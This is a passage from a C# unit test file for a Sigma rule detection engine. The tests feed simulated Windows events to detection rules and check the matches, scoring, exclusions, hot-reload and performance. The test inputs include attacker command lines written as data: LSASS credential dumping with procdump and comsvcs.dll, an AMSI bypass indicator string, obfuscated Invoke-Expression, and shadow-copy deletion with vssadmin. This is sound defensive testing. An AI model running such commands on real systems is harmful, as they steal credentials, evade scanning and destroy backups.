        engine.Evaluate(benign).Should().NotContain(m => m.RuleId == "6a100011-5e77-4b21-9c11-000000000011");
    }

    [Fact]
    public void Rule12_LsassCredentialDump_PositiveAndNegative()
    {
        using var engine = new SigmaEngine();
        engine.LoadFromDirectory(RepoRulesDir);

        var procdump = MakeProcessEvent(@"C:\Tools\procdump64.exe", "procdump64.exe -accepteula -ma lsass.exe lsass.dmp");
        var comsvcs = MakeProcessEvent(@"C:\Windows\System32\rundll32.exe", @"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 640 C:\Temp\dump.bin full");
        var benign = MakeProcessEvent(@"C:\Tools\procdump64.exe", "procdump64.exe -ma notepad.exe app.dmp");

        engine.Evaluate(procdump).Should().Contain(m => m.RuleId == "6a100012-5e77-4b21-9c12-000000000012");
        engine.Evaluate(comsvcs).Should().Contain(m => m.RuleId == "6a100012-5e77-4b21-9c12-000000000012");
        engine.Evaluate(benign).Should().NotContain(m => m.RuleId == "6a100012-5e77-4b21-9c12-000000000012");
    }

    [Fact]
    public void Rule13_PowerShell4104ObfuscatedScript_PositiveAndNegative()
    {
        using var engine = new SigmaEngine();
        engine.LoadFromDirectory(RepoRulesDir);

        var simulatedIndicator = string.Concat("System.Management.Automation.", "Amsi", "Utils", " ", "amsi", "Init", "Failed");
        var amsiBypass = MakeScriptBlockEvent(simulatedIndicator);
        var tickObf = MakeScriptBlockEvent("I`n`v`o`k`e-Expression $s");
        var benign = MakeScriptBlockEvent("Get-ChildItem C:\\Logs | Where-Object { $_.Length -gt 0 }");

        engine.Evaluate(amsiBypass).Should().Contain(m => m.RuleId == "6a100013-5e77-4b21-9c13-000000000013");
        engine.Evaluate(tickObf).Should().Contain(m => m.RuleId == "6a100013-5e77-4b21-9c13-000000000013");
        engine.Evaluate(benign).Should().NotContain(m => m.RuleId == "6a100013-5e77-4b21-9c13-000000000013");
    }

    [Fact]
    public void Rule14_OfficeSpawnShell_PositiveAndNegative()
    {
        using var engine = new SigmaEngine();
        engine.LoadFromDirectory(RepoRulesDir);

        var malicious = MakeProcessEvent(
            @"C:\Windows\System32\cmd.exe",
            "cmd.exe /c powershell -c whoami",
            @"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE");
        engine.Evaluate(malicious).Should().Contain(m => m.RuleId == "6a100014-5e77-4b21-9c14-000000000014");

        var benign = MakeProcessEvent(
            @"C:\Windows\System32\cmd.exe",
            "cmd.exe /c dir",
            @"C:\Windows\explorer.exe");
        engine.Evaluate(benign).Should().NotContain(m => m.RuleId == "6a100014-5e77-4b21-9c14-000000000014");
    }

    // =========================================================================
    // 4. Scoring, gestion des regles, exclusions, resilience et hot-reload
    // =========================================================================

    [Theory]
    [InlineData("informational", 15)]
    [InlineData("low", 35)]
    [InlineData("medium", 60)]
    [InlineData("high", 80)]
    [InlineData("critical", 95)]
    public void EvaluateAsAssessment_MapsSigmaLevelToExpectedScoreAndSource(string level, int expectedScore)
    {
        using var engine = new SigmaEngine();
        engine.LoadRuleYaml($"""
            title: Level {level} Rule
            id: lvl-{level}
            level: {level}
            logsource:
                product: windows
                category: process_creation
            detection:
                selection:
                    Image|endswith: '\probe.exe'
                condition: selection
            tags:
                - attack.execution
                - attack.t1059.001
            """);

        var assessment = engine.EvaluateAsAssessment(MakeProcessEvent(@"C:\Tools\probe.exe"));
        assessment.Should().NotBeNull();
        assessment!.Score.Should().Be(expectedScore);
        assessment.Source.Should().Be(AssessmentSource.Sigma);
        assessment.MatchedRules.Should().Contain("lvl-" + level);
        assessment.MitreTechniques.Should().Contain("T1059.001");
        assessment.ScoreContributions.Should().ContainSingle(c => c.Engine == "Sigma" && c.Score == expectedScore);

        engine.EvaluateAsAssessment(MakeProcessEvent(@"C:\Tools\other.exe")).Should().BeNull();
    }

    [Fact]
    public void SetRuleEnabled_AndGetRuleSummaries_TracksMatchCount()
    {
        using var engine = new SigmaEngine();
        engine.LoadRuleYaml("""
            title: Toggleable Rule
            id: toggle-001
            level: high
            logsource:
                product: windows
                category: process_creation
            detection:
                selection:
                    Image|endswith: '\evil.exe'
                condition: selection
            """);

        var evt = MakeProcessEvent(@"C:\Temp\evil.exe");
        engine.Evaluate(evt).Should().ContainSingle();
        engine.Evaluate(evt).Should().ContainSingle();

        var summary = engine.GetRuleSummaries().Should().ContainSingle().Subject;
        summary.Id.Should().Be("toggle-001");
        summary.Engine.Should().Be("Sigma");
        summary.Enabled.Should().BeTrue();
        summary.MatchCount.Should().Be(2);

        engine.SetRuleEnabled("toggle-001", false).Should().BeTrue();
        engine.EnabledRuleCount.Should().Be(0);
        engine.Evaluate(evt).Should().BeEmpty();

        engine.SetRuleEnabled("toggle-001", true).Should().BeTrue();
        engine.Evaluate(evt).Should().ContainSingle();
        engine.GetRuleSummaries()[0].MatchCount.Should().Be(3);
    }

    [Fact]
    public void SetExclusions_SkipsDisabledRulesAndExcludedTargets()
    {
        using var engine = new SigmaEngine();
        engine.LoadRuleYaml("""
            title: Rule A
            id: excl-a
            level: high
            logsource:
                product: windows
                category: process_creation
            detection:
                selection:
                    CommandLine|contains: 'suspicious'
                condition: selection
            """);
        engine.LoadRuleYaml("""
            title: Rule B
            id: excl-b
            level: high
            logsource:
                product: windows
                category: process_creation
            detection:
                selection:
                    CommandLine|contains: 'suspicious'
                condition: selection
            """);

        engine.SetExclusions(["excl-a"], ["TrustedScanner.exe"]);

        var normalEvt = MakeProcessEvent(@"C:\Temp\unknown.exe", "run suspicious payload");
        engine.Evaluate(normalEvt).Select(m => m.RuleId).Should().Equal("excl-b");

        var excludedTargetEvt = MakeProcessEvent(@"C:\Program Files\Vendor\TrustedScanner.exe", "run suspicious check");
        engine.Evaluate(excludedTargetEvt).Should().BeEmpty();

        // Un attaquant ne doit pas contourner l'exclusion en mentionnant TrustedScanner.exe dans CommandLine
        var spoofAttempt = MakeProcessEvent(@"C:\Temp\attacker.exe", "run suspicious # TrustedScanner.exe");
        engine.Evaluate(spoofAttempt).Select(m => m.RuleId).Should().Equal("excl-b");
    }

    [Fact]
    public void LoadFromDirectory_MalformedYamlDoesNotCrashAndCollectsLoadErrors()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), "sentinel-sigma-test-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(tempDir);
        try
        {
            File.WriteAllText(Path.Combine(tempDir, "valid.yml"), """
                title: Valid Rule
                id: valid-01
                level: medium
                logsource:
                    product: windows
                    category: process_creation
                detection:
                    selection:
                        Image|endswith: '\goodtest.exe'
                    condition: selection
                """);
            File.WriteAllText(Path.Combine(tempDir, "broken_yaml.yml"), "title: [unterminated\n  bad: : :");
            File.WriteAllText(Path.Combine(tempDir, "bad_condition.yml"), """
                title: Bad Condition
                id: bad-cond
                detection:
                    selection:
                        Image: 'a.exe'
                    condition: selection and unknown_ref
                """);
            File.WriteAllText(Path.Combine(tempDir, "bad_regex.yml"), """
                title: Bad Regex
                id: bad-rx
                detection:
                    selection:
                        CommandLine|re: '[unclosed('
                    condition: selection
                """);

            using var engine = new SigmaEngine();
            var result = engine.LoadFromDirectory(tempDir);

            result.LoadedCount.Should().Be(1);
            result.Errors.Should().HaveCount(3);
            engine.LoadErrors.Should().HaveCount(3);
            engine.Evaluate(MakeProcessEvent(@"C:\Temp\goodtest.exe")).Should().ContainSingle(m => m.RuleId == "valid-01");
        }
        finally
        {
            if (Directory.Exists(tempDir))
                Directory.Delete(tempDir, recursive: true);
        }
    }

    [Fact]
    public void HotReload_DetectsNewRuleFileAndReloadsAutomatically()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), "sentinel-sigma-hot-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(tempDir);
        try
        {
            using var engine = new SigmaEngine();
            engine.LoadFromDirectory(tempDir);
            engine.RuleCount.Should().Be(0);

            using var reloaded = new ManualResetEventSlim(false);
            engine.RulesReloaded += (_, _) => reloaded.Set();
            engine.EnableHotReload(tempDir, debounceMs: 100);

            File.WriteAllText(Path.Combine(tempDir, "dynamic.yml"), """
                title: Hot Reloaded Rule
                id: hot-001
                level: high
                logsource:
                    product: windows
                    category: process_creation
                detection:
                    selection:
                        Image|endswith: '\hotreload.exe'
                    condition: selection
                """);

            reloaded.Wait(TimeSpan.FromSeconds(5)).Should().BeTrue("le FileSystemWatcher doit declencher le rechargement a chaud");
            engine.RuleCount.Should().Be(1);
            engine.Evaluate(MakeProcessEvent(@"C:\Temp\hotreload.exe")).Should().ContainSingle(m => m.RuleId == "hot-001");
        }
        finally
        {
            if (Directory.Exists(tempDir))
                Directory.Delete(tempDir, recursive: true);
        }
    }

    [Fact]
    public void ProcessCreationRules_DoNotTriggerOnProcessStopEvents()
    {
        using var engine = new SigmaEngine();
        engine.LoadFromDirectory(RepoRulesDir);

        var stopEvt = MakeProcessEvent(
            @"C:\Windows\System32\vssadmin.exe",
            "vssadmin.exe delete shadows /all /quiet",
            eventType: EventTypes.ProcessStop);

        engine.Evaluate(stopEvt).Should().BeEmpty();
    }

    [Fact]
    public void Engine_IsThreadSafeUnderConcurrentEvaluationAndRuleToggles()
    {
        using var engine = new SigmaEngine();
        engine.LoadFromDirectory(RepoRulesDir);

        var events = new[]
        {
            MakeProcessEvent(@"C:\Windows\System32\vssadmin.exe", "vssadmin.exe delete shadows /all /quiet"),
            MakeProcessEvent(@"C:\Windows\System32\notepad.exe", "notepad.exe notes.txt"),
            MakeFileEvent(@"C:\Users\alice\Downloads\doc.pdf.exe"),
            MakeScriptBlockEvent("AmsiUtils")
        };

        Parallel.For(0, 1000, i =>
        {
            var evt = events[i % events.Length];
            _ = engine.Evaluate(evt);
            if (i % 200 == 0)
            {
                engine.SetRuleEnabled("6a100001-5e77-4b21-9c01-000000000001", i % 400 == 0);
                _ = engine.GetRuleSummaries();
            }
        });

        engine.GetRuleSummaries().Should().HaveCount(14);
    }

    // =========================================================================
    // 5. Benchmark haute performance : 1 000 regles x 10 000 evenements < 5 s
    // =========================================================================

    [Fact]
    public void Benchmark_1000Rules_10000Events_CompletesUnder5Seconds()
    {
        var parser = new SigmaRuleParser();
        var rules = new List<SigmaRule>(1000);

        for (var i = 0; i < 1000; i++)
        {
            string yaml;
            if (i < 600)
            {
                // 600 regles process_creation avec selection + filter
                yaml = $"""
                    title: Bench Process Rule {i}
                    id: bench-proc-{i:D4}
                    level: medium
                    logsource:
                        product: windows
                        category: process_creation
                    detection:
                        selection:
                            Image|endswith: '\tool_{i:D4}.exe'
                            CommandLine|contains|windash:
                                - ' -stage{i:D4}'
                                - ' -exec{i:D4}'
                        filter_ok:
                            User|contains: 'TRUSTED_SVC'
                        condition: selection and not filter_ok
                    tags:
                        - attack.execution
                        - attack.t1059
                    """;
            }
            else if (i < 800)
            {
                // 200 regles file_event
                yaml = $"""
                    title: Bench File Rule {i}
                    id: bench-file-{i:D4}
                    level: medium
                    logsource:
                        product: windows
                        category: file_event
                    detection:
                        selection:
                            TargetFilename|contains: 'dropper_marker_{i:D4}.bin'
                        condition: selection
                    """;
            }
            else if (i < 900)
            {
                // 100 regles network_connection / dns_query
                yaml = $"""
                    title: Bench Network Rule {i}
                    id: bench-net-{i:D4}
                    level: high
                    logsource:
                        product: windows
                        category: dns_query
                    detection:
                        selection:
                            QueryName|endswith: '.c2node{i:D4}.invalid'
                        condition: selection
                    """;
            }
            else
            {
                // 100 regles ps_script
                yaml = $"""
                    title: Bench Script Rule {i}
                    id: bench-ps-{i:D4}
                    level: high
                    logsource:
                        product: windows
                        category: ps_script
                    detection:
                        selection:
                            ScriptBlockText|contains: 'Invoke-EvilPayload{i:D4}'
                        condition: selection
                    """;
            }

            rules.Add(parser.Parse(yaml, $"bench_{i:D4}.yml"));
        }

        using var engine = new SigmaEngine();
        engine.LoadRules(rules);
        engine.RuleCount.Should().Be(1000);

        // Construire 10 000 evenements realistes (98% benins + 200 malveillants correspondant aux regles)
        var events = new SecurityEvent[10_000];
        for (var e = 0; e < events.Length; e++)
        {
            if (e % 50 == 0)
            {
                var target = ((e / 50) * 5) % 1000;
                events[e] = target switch
                {
                    < 600 => MakeProcessEvent($@"C:\Temp\tool_{target:D4}.exe", $"tool_{target:D4}.exe /stage{target:D4}"),
                    < 800 => MakeFileEvent($@"C:\Users\alice\AppData\Local\Temp\dropper_marker_{target:D4}.bin"),
                    < 900 => MakeNetworkEvent("198.51.100.10", 53, $"beacon.c2node{target:D4}.invalid", EventTypes.DnsQuery),
                    _ => MakeScriptBlockEvent($"Invoke-EvilPayload{target:D4} -Force")
                };
            }
            else
            {
                events[e] = (e % 4) switch
                {
                    0 => MakeProcessEvent(@"C:\Windows\System32\svchost.exe", "svchost.exe -k netsvcs -p"),
                    1 => MakeFileEvent($@"C:\Users\alice\Documents\report_{e}.docx"),
                    2 => MakeNetworkEvent("13.107.42.14", 443, "portal.office.com", EventTypes.DnsQuery),
                    _ => MakeScriptBlockEvent("Get-Date | Out-Null")
                };
            }
        }

        // Prechauffage JIT
        for (var w = 0; w < 20; w++)
            _ = engine.Evaluate(events[w]);

        var sw = Stopwatch.StartNew();
        var totalMatches = 0;
        for (var e = 0; e < events.Length; e++)
        {
            totalMatches += engine.Evaluate(events[e]).Count;
        }
        sw.Stop();

        totalMatches.Should().BeGreaterThanOrEqualTo(200);
        sw.Elapsed.TotalSeconds.Should().BeLessThan(5.0,
            $"1 000 regles sur 10 000 evenements doivent s'executer en moins de 5s (mesure : {sw.Elapsed.TotalMilliseconds:F1} ms)");
    }
}
